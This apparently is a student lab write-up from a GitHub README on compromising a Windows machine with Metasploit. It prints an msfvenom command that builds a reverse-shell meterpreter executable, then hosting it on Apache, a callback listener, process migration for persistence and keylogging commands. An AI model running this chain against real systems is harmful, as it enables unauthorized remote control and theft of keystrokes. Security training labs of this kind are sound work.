# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
![Uploading image.png…]()

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="987" height="157" alt="image" src="https://github.com/user-attachments/assets/dd1e41e5-b0a2-4c42-b371-caf08aad519c" />


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:


<img width="492" height="81" alt="image" src="https://github.com/user-attachments/assets/2fc45d52-0389-432e-a75b-0c74084927ac" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

<img width="551" height="80" alt="image" src="https://github.com/user-attachments/assets/f8c9182d-d9fe-4e1e-a959-39e5adac08f9" />

Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="1056" height="377" alt="image" src="https://github.com/user-attachments/assets/3156a032-52c3-4b8e-af5f-4ef1b8c5888f" />


Check the status of apache2
## OUTPUT:

<img width="1010" height="582" alt="image" src="https://github.com/user-attachments/assets/801cd611-c66d-4e76-bcac-2c7604866b8a" />


Invoke msfconsole:
## OUTPUT:

<img width="1011" height="630" alt="image" src="https://github.com/user-attachments/assets/e8a29bde-7efb-447e-80ac-c13f9f1f2891" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="792" height="230" alt="image" src="https://github.com/user-attachments/assets/3d472932-74a5-412b-b2fa-d9fca13e5fc6" />




Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="1041" height="760" alt="image" src="https://github.com/user-attachments/assets/50901349-664e-4882-ac00-bf4a02bad9ed" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

<img width="1052" height="667" alt="image" src="https://github.com/user-attachments/assets/b6d3ba75-897e-4d47-ae77-0c3527de7c05" />



Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="412" height="47" alt="image" src="https://github.com/user-attachments/assets/c543a4bb-30e1-45bf-8f42-396d61288d97" />



On kali/parrot give the command exploit
## OUTPUT:
<img width="483" height="157" alt="image" src="https://github.com/user-attachments/assets/d1891914-1247-4ac2-9878-cb38e0773d84" />




To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:


<img width="758" height="461" alt="image" src="https://github.com/user-attachments/assets/53076494-e064-4f50-ac85-b4f427ab0389" />

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe

at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:


<img width="397" height="47" alt="image" src="https://github.com/user-attachments/assets/ed290291-c73e-4849-8be1-4be4d37e782f" />


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:

<img width="2171" height="724" alt="image" src="https://github.com/user-attachments/assets/1fd11882-7fa1-4535-9f73-ef626726abf1" />

<img width="397" height="47" alt="image" src="https://github.com/user-attachments/assets/ed290291-c73e-4849-8be1-4be4d37e782f" />


keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:

<img width="1541" height="1020" alt="image" src="https://github.com/user-attachments/assets/1c8f9480-3860-4768-8b38-99a7f2bdde37" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.



